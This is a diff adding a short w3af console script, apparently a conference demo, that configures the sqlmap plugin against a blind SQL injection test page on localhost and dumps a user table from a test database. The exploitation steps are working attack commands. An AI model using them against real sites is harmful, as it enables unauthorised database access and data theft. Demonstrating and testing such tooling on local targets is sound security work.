@@ -1,0 +1,28 @@
+# Second demo for www.t2.fi
+
+misc-settings
+set demo True
+back
+
+plugins
+output console,textFile
+output
+output config textFile
+set fileName output-w3af.txt
+set verbosity 10
+back
+output config console
+set verbosity 0
+back
+output
+back
+exploit
+exploit config sqlmap
+set url http://localhost/w3af/blindSqli/blindSqli-t2.php
+set injvar id
+set data id=1
+view
+back
+fastexploit sqlmap
+
+dump userTable w3af_test
